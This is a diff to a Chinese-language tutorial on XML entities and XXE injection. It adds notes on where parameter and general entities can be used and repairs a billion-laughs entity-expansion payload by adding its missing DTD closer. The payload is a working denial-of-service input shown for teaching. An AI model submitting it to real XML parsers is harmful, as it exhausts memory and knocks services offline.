@@ -132,6 +132,10 @@
      ```
 
      在这个例子中，`%greeting;` 是一个参数实体，被定义为 "Hello, "，然后 `%message;` 在DTD中使用了 `%greeting;` 来定义最终的文本 "Hello, World!"。
+   
+   * 注意：
+     * **参数实体只能在外部DTD使用**
+     * &xxe；这样的通用实体无法用于SYSTEM等关键字后的url拼接
 
 ### XXE注入
 
@@ -169,10 +173,11 @@
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
 <tag>&lol9;</tag>
 ```
 
-* 上面的payload被称为billionlaughs攻击，简单分析可以得出，xml解析过程中递归产生了上亿个lol字符，而许多的xml解析器在解析xml文档时秦翔宇将它的整个结构保存在内存中，这样就会占用大量内存资源，造成拒绝服务攻击
+* 上面的payload被称为billionlaughs攻击，简单分析可以得出，xml解析过程中递归产生了上亿个lol字符，而许多的xml解析器在解析xml文档时倾向于将它的整个结构保存在内存中，这样就会占用大量内存资源，造成拒绝服务攻击
 
 ##### SSRF
 
